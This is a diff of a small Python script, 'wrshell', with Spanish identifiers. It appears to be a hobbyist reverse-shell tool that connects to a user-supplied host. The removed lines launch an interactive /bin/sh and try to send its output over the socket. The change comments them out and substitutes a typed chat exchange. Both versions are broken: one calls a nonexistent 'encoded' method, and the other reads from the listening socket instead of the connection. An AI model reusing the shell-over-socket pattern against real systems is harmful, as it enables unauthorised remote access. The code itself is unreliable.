@@ -15,7 +15,9 @@ def wrshell():
               conexion, addr=misocket.accept();
               print("nueva conexion establecida");
               print(addr);
-              mensaje="coneccion exitosa"
+              resp=misocket.recv(1024);
+              print(resp);
+              mensaje=input("mensaje: ")
               conexion.sendall(mensaje.encode('utf-8'));
     if(opcion == "e" or opcion=="E"):
         hostE=input("host: ");
@@ -23,8 +25,11 @@ def wrshell():
         misocketE=socket.socket();
         misocketE.connect((hostE,puertoE));
         while True:
-            p=subprocess.run(["/bin/sh","-i"]);
-            misocketE.sendall(p.encoded('utf-8'));
+            #p=subprocess.run(["/bin/sh","-i"]);
+            #misocketE.sendall(p.encoded('utf-8'));
+            #respuesta=misocketE.recv(1024);
+            mensajeE=input("mensaje: ");
+            misocketE.sendall(mensajeE.encode('utf-8'));
             respuesta=misocketE.recv(1024);
             print(respuesta);
 wrshell();
